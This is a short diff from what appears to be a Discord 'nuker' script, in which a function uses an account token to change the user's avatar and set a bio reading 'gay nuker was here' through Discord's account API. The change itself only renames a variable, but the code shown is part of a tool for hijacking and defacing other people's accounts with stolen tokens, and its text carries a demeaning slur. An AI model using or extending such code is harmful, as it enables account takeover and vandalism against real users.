@@ -178,9 +178,9 @@ def change_details(headers, token):
     with open('source/avatar.png', 'rb') as file:
         avatar = 'data:image/png;base64, ' + ''.join(base64.b64encode(file.read()).decode())
 
-    avatar = {'avatar': avatar, 'bio': 'gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here'}
+    payload = {'avatar': avatar, 'bio': 'gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here gay nuker was here'}
     url = 'https://discord.com/api/v9/users/@me'
-    request = requests.patch(url, headers=headers, json=avatar)
+    request = requests.patch(url, headers=headers, json=payload)
     
     match request.status_code:
         case 200:
